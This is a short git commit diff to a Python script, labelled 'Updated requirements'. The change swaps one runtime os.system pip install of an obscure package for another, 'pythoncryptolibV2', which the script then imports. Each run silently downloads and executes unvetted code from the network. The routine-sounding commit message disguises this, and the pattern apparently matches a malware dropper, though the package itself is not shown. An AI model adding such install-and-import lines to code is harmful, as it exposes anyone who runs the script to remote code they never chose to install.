2fd37c58b7ffc19d243a17570cf8de584b7a6208
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-01 17:57:25 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolourlibraryV1")
-import pythoncolourlibraryV1
+os.system("pip install pythoncryptolibV2")
+import pythoncryptolibV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
